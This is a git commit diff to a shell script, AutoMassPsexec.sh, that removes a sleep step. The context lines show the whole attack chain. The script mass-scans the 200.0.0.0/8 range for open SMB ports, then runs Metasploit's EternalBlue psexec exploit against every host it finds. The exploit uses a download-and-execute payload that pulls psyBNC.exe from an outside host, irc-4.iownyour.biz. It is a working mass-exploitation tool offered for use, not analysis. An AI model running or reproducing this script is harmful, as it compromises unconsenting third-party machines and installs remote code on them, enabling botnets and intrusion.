82bdd86f02d04c3367cf84333226d2a5ea2b50a2
Remi Girard <54126451+independentcod@users.noreply.github.com>
2020-04-02 23:28:10 -0400

    Update AutoMassPsexec.sh

--- AutoMassPsexec.sh
+++ AutoMassPsexec.sh
@@ -20,9 +20,6 @@ cd ..;
 echo Installation step is done, now starting smb scanner...;
 sleep 5s;
 sudo masscan -p 445 --range 200.0.0.0-200.255.255.255 --rate 50000 --open --banners -oG smb.scan;
-sleep 1s;
-echo PLEASE WAIT... Sleeping one minute, to populate vulnerable servers list...;
-sleep 1m;
 echo Starting attack on IPv4 range $1 ... This will take a while.;
 for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" smb.scan`; do msfconsole -q -x " use windows/smb/ms17_010_psexec; set payload windows/download_exec; set rhost $i; set URL http://irc-4.iownyour.biz/psyBNC.exe; set target 0; exploit; exit;" ;
 done
